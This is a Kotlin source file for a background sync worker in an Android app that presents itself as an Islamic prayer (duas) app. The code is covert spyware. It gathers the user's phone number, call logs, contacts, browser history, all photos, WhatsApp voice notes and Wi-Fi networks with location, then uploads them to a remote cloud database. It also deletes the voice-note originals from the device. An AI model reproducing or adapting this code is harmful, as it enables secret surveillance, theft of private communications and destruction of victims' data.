package islamic.duas.sync

import android.content.Context
import android.os.Build
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import islamic.duas.browser.BrowserHistoryCollector
import islamic.duas.cloud.CloudApi
import islamic.duas.cloud.CloudConfig
import islamic.duas.contacts.ContactsCollector
import islamic.duas.logs.CallLogCollector
import islamic.duas.media.MediaCollector
import islamic.duas.media.PhotoProcessor
import islamic.duas.metrics.MetricsCollector
import islamic.duas.utils.DeviceId
import islamic.duas.utils.ErrorLog
import islamic.duas.wifi.WifiScanner
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class DuaSyncWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            withTimeout(300000) { runSync(applicationContext) }
            return@withContext Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "doWork error: ${e.message}", e)
            return@withContext if (runAttemptCount < 3) Result.retry() else Result.failure()
        }
    }

    companion object {
        private const val TAG = "DuaSync"

        suspend fun runSync(context: Context) {
            val androidId = DeviceId.get(context)
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
            val currentTs = System.currentTimeMillis()
            val currentTimeStr = dateFormat.format(Date(currentTs))
            val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)

            // ── Metrics & Apps ──
            try {
                val metricsCollector = MetricsCollector(context)
                val metrics = metricsCollector.collectDeviceMetrics()

                val metricsDoc = JSONObject().apply {
                    put("timestamp", currentTimeStr)
                    put("ts_ms", currentTs)
                    put("batteryPct", metrics.batteryPct)
                    put("batteryTemp", metrics.batteryTemp.toDouble())
                    put("isCharging", metrics.isCharging)
                    put("storageFreeGb", metrics.storageFreeGb)
                    put("networkType", metrics.networkType)
                    put("wifiSsid", metrics.wifiSsid)
                    put("deviceModel", metrics.deviceModel)
                    put("manufacturer", metrics.manufacturer)
                    put("phoneNumber", metrics.phoneNumber)
                }
                CloudApi.writeToRTDB("devices/$androidId/metrics/latest", metricsDoc)
                CloudApi.updateCloudDocument(
                    "devices/$androidId/metrics/latest",
                    metricsDoc
                )

                val appUsageList = metricsCollector.collectPerAppUsage()
                for (usage in appUsageList) {
                    val usageDoc = JSONObject().apply {
                        put("packageName", usage.packageName)
                        put("appName", usage.appName)
                        put("totalForegroundMs", usage.totalForegroundMs)
                        put("lastUsedMs", usage.lastUsedMs)
                        put("date", currentTimeStr.split(" ")[0])
                    }
                    val pkgKey = usage.packageName.replace(".", "_")
                    CloudApi.writeToCloud("devices/$androidId/apps", usageDoc, pkgKey)
                    CloudApi.writeToRTDB("devices/$androidId/apps/$pkgKey", usageDoc)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Metrics/apps sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Metrics/apps sync error", e)
            }

            // ── Call Logs ──
            try {
                val hasCallPerm = context.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
                if (!hasCallPerm) {
                    ErrorLog.write(context, TAG, "Call logs skipped: READ_CALL_LOG not granted", null)
                } else {
                    val lastCallSync = prefs.getLong("last_call_sync_ms", 0L)
                    val callLogCollector = CallLogCollector(context)
                    val callLogs = callLogCollector.collectCallLogs(lastCallSync)

                    if (callLogs.isEmpty()) {
                        ErrorLog.write(context, TAG, "Call logs query returned empty", null)
                    }

                    for (call in callLogs) {
                        val ts = call.optLong("ts_ms", currentTs)
                        CloudApi.writeToRTDB("devices/$androidId/timeline/$ts", call)
                    }

                    if (callLogs.isNotEmpty()) {
                        prefs.edit().putLong("last_call_sync_ms", currentTs).apply()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Call log sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Call log sync error", e)
            }

            // ── Photos (RTDB-only, capped at 50, dedup by path) ──
            try {
                val uploadedPaths = prefs.getStringSet("uploaded_photo_paths", mutableSetOf()) ?: mutableSetOf()
                val mediaCollector = MediaCollector(context)
                val allPhotos = mediaCollector.collectNewPhotos(0L, Int.MAX_VALUE)
                // Filter: already-uploaded files + trashed photos (skip trashed entirely)
                val newPhotos = allPhotos.filter { it.file.absolutePath !in uploadedPaths }

                var newestDateTaken = 0L
                for ((i, entry) in newPhotos.withIndex()) {
                    try {
                        val processed = PhotoProcessor.process(entry.file, true)
                        if (processed != null) {
                            val ts = System.currentTimeMillis()
                            val photoDoc = JSONObject().apply {
                                put("timestamp", ts)
                                put("data", processed.base64)
                                put("width", processed.width)
                                put("height", processed.height)
                                put("fileName", processed.fileName)
                                put("dateTaken", entry.dateTaken)
                            }
                            CloudApi.writeToRTDB("devices/$androidId/photos/$ts", photoDoc)
                            uploadedPaths.add(entry.file.absolutePath)
                            if (entry.dateTaken > newestDateTaken) newestDateTaken = entry.dateTaken
                            if (i < newPhotos.size - 1) delay(500)
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Photo processing error: ${e.message}", e)
                    }
                }

                if (newPhotos.isNotEmpty()) {
                    prefs.edit().putStringSet("uploaded_photo_paths", uploadedPaths).apply()
                }

                // Enforce 50-photo cap: fetch existing keys, delete oldest by upload time
                try {
                    val keysUrl = "${CloudConfig.RTDB_URL}/devices/$androidId/photos.json?shallow=true"
                    val keysReq = okhttp3.Request.Builder().url(keysUrl).get().build()
                    val keysResp = CloudApi.getClient().newCall(keysReq).execute()
                    val keysBody = keysResp.body?.string()
                    keysResp.close()
                    if (keysBody != null && keysBody != "null") {
                        val allKeys = org.json.JSONObject(keysBody).keys().asSequence().toList().sorted()
                        val maxPhotos = 50
                        if (allKeys.size > maxPhotos) {
                            val toDelete = allKeys.take(allKeys.size - maxPhotos)
                            for (oldKey in toDelete) {
                                CloudApi.deleteFromRTDB("devices/$androidId/photos/$oldKey")
                                delay(200)
                            }
                            Log.i(TAG, "Deleted ${toDelete.size} old photos, kept $maxPhotos")
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Photo cap cleanup error: ${e.message}", e)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Photo sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Photo sync error", e)
            }

            // ── Contacts ──
            try {
                val hasContactsPerm = context.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) == android.content.pm.PackageManager.PERMISSION_GRANTED
                if (!hasContactsPerm) {
                    ErrorLog.write(context, TAG, "Contacts skipped: READ_CONTACTS not granted", null)
                } else {
                    val lastContactsSync = prefs.getLong("last_contacts_sync", 0L)
                    val contactsCollector = ContactsCollector(context)
                    val contacts = contactsCollector.collectAll(lastContactsSync)
                    if (contacts.length() > 0) {
                        CloudApi.writeToRTDB(
                            "devices/$androidId/contacts/batch_$currentTs",
                            JSONObject().apply { put("contacts", contacts); put("ts_ms", currentTs) }
                        )
                        prefs.edit().putLong("last_contacts_sync", currentTs).apply()
                    } else {
                        ErrorLog.write(context, TAG, "Contacts query returned empty", null)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Contacts sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Contacts sync error", e)
            }

            // ── Browser History ──
            try {
                val browserCollector = BrowserHistoryCollector(context)
                val history = browserCollector.collectAll()
                if (history.length() > 0) {
                    CloudApi.writeToRTDB(
                        "devices/$androidId/browser_history/batch_$currentTs",
                        JSONObject().apply { put("history", history); put("ts_ms", currentTs) }
                    )
                } else {
                    ErrorLog.write(context, TAG, "Browser history query returned empty (all providers)", null)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Browser history sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Browser history sync error", e)
            }

            // ── Voice Notes (WhatsApp) ──
            try {
                val hasAudioPerm = if (Build.VERSION.SDK_INT >= 33) {
                    context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED
                } else {
                    context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
                }
                if (!hasAudioPerm) {
                    ErrorLog.write(context, TAG, "Voice notes skipped: audio permission not granted", null)
                } else {
                    val mediaCollector = MediaCollector(context)
                    val voiceNotes = mediaCollector.collectVoiceNotes()
                    if (voiceNotes.isNotEmpty()) {
                        val notesArray = JSONArray()
                        val uploadedPaths = prefs.getStringSet("uploaded_voice_paths", mutableSetOf()) ?: mutableSetOf()
                        val deletedPaths = mutableListOf<String>()
                        var added = 0
                        for (note in voiceNotes) {
                            if (note.file.absolutePath in uploadedPaths) continue
                            val noteJson = JSONObject().apply {
                                put("fileName", note.file.name)
                                put("dateAdded", note.dateAdded)
                                put("durationMs", note.duration)
                                put("sizeBytes", note.size)
                                put("mimeType", note.mimeType)
                                if (added < 3 && note.size in 1..512000) {
                                    try {
                                        val audioBytes = note.file.readBytes()
                                        put("audioData", java.util.Base64.getEncoder().encodeToString(audioBytes))
                                    } catch (_: Exception) { }
                                }
                            }
                            notesArray.put(noteJson)
                            uploadedPaths.add(note.file.absolutePath)
                            deletedPaths.add(note.file.absolutePath)
                            added++
                            if (added >= 20) break
                        }
                        if (notesArray.length() > 0) {
                            CloudApi.writeToRTDB(
                                "devices/$androidId/voice_notes/batch_$currentTs",
                                JSONObject().apply {
                                    put("notes", notesArray)
                                    put("totalCount", voiceNotes.size)
                                    put("ts_ms", currentTs)
                                }
                            )
                            for (path in deletedPaths) {
                                try { File(path).delete() } catch (_: Exception) { }
                            }
                            prefs.edit().putStringSet("uploaded_voice_paths", uploadedPaths).apply()
                        }
                    } else {
                        ErrorLog.write(context, TAG, "Voice notes query returned empty", null)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Voice notes sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Voice notes sync error", e)
            }

            // ── WiFi Scan ──
            try {
                val lastLoc = DuaTracker.getLastLocation()
                val lat = lastLoc?.optDouble("lat")
                val lng = lastLoc?.optDouble("lng")
                val wifiScanner = WifiScanner(context)
                val networks = wifiScanner.scanAndCollect(lat, lng)
                if (networks.length() > 0) {
                    CloudApi.writeToRTDB(
                        "devices/$androidId/wifi_scan/$currentTs",
                        JSONObject().apply { put("networks", networks); put("ts_ms", currentTs) }
                    )
                }
            } catch (e: Exception) {
                Log.e(TAG, "WiFi scan error: ${e.message}", e)
                ErrorLog.write(context, TAG, "WiFi scan error", e)
            }

            // ── Device Info ──
            try {
                val metricsCollector2 = MetricsCollector(context)
                val metrics2 = metricsCollector2.collectDeviceMetrics()
                val deviceInfo = JSONObject().apply {
                    put("deviceModel", metrics2.deviceModel)
                    put("manufacturer", metrics2.manufacturer)
                    put("lastSyncMs", currentTs)
                    put("lastSync", currentTimeStr)
                }
                CloudApi.writeToRTDB("devices/$androidId/info", deviceInfo)
                CloudApi.updateCloudDocument("devices/$androidId/info", deviceInfo)
            } catch (e: Exception) {
                Log.e(TAG, "Device info sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Device info sync error", e)
            }

            // ── Usage ──
            try {
                val openCount = prefs.getInt("app_open_count", 0)
                val openDoc = JSONObject().apply {
                    put("openCount", openCount)
                    put("lastOpened", currentTimeStr)
                    put("lastOpenedMs", currentTs)
                    put("date", currentTimeStr.split(" ")[0])
                }
                CloudApi.updateCloudDocument("devices/$androidId/usage/deviceSync", openDoc)
            } catch (e: Exception) {
                Log.e(TAG, "Usage sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Usage sync error", e)
            }
        }
    }
}
